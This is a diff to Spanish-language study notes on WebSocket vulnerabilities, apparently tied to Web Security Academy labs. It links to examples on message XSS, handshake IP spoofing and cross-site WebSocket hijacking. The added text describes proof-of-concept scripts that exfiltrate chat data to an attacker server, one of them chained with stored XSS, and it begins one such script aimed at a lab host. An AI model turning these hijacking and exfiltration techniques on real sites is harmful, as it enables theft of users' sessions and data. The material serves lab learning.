@@ -1,4 +1,9 @@
-WEBSOCKET
+# WEBSOCKET
+
+> Labs → [[vulnerabilities/012-websockets/labs/README|labs]] · Ejemplos: [[vulnerabilities/012-websockets/examples/001-manipular-mensaje-xss|001 · mensaje XSS]] · [[vulnerabilities/012-websockets/examples/002-handshake-ip-spoof-filtro|002 · handshake IP spoof]] · [[vulnerabilities/012-websockets/examples/003-cross-site-websocket-hijacking|003 · CSWSH]]
+
+> [!note] PoCs de CSWSH (abajo)
+> El primer `<script>` es el CSWSH básico (abre WS → `READY` → exfil a tu exploit server). El segundo es la variante **encadenada**: fuerza el login de la víctima con un `username` que lleva el JS de exfil (stored XSS + CSWSH). Reemplazá `url`, `attackerServer` y los LAB-ID.
 
 <script>
 const url = "wss://0ad8004b04f1105b80902bb500d3003d.web-security-academy.net/chat" 
